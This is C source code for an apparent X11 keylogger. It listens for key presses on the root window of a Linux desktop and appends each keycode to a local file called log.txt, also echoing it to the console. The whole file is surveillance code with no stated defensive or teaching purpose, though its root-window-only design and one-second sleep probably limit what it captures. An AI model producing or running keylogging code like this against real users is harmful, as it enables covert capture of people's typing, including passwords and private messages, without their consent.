#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define LOGFILE "log.txt"

void log_key(int keycode) {
    FILE *file = fopen(LOGFILE, "a"); // Open log file in append mode
    if (file) {
        fprintf(file, "Keycode: %d\n", keycode); // Log the keycode
        fclose(file); // Close the log file
    } else {
        // Print a detailed error message if unable to open the file
        perror("Error opening log file");
    }
}

int main() {
    Display *display;
    Window root;
    XEvent event;

    // Open connection to the X server
    display = XOpenDisplay(NULL);
    if (display == NULL) {
        fprintf(stderr, "Cannot open display\n");
        exit(1);
    }

    root = DefaultRootWindow(display);

    // Select input events for the root window
    XSelectInput(display, root, KeyPressMask | KeyReleaseMask);

    while (1) {
        // Wait for the next event
        XNextEvent(display, &event);
        if (event.type == KeyPress) {
            printf("Key pressed: %d\n", event.xkey.keycode); // Print keycode to console for debugging
            log_key(event.xkey.keycode); // Log the keycode
        }
        sleep(1); // Sleep for 1 second to reduce CPU usage
    }

    // Close the display connection
    XCloseDisplay(display);
    return 0;
}
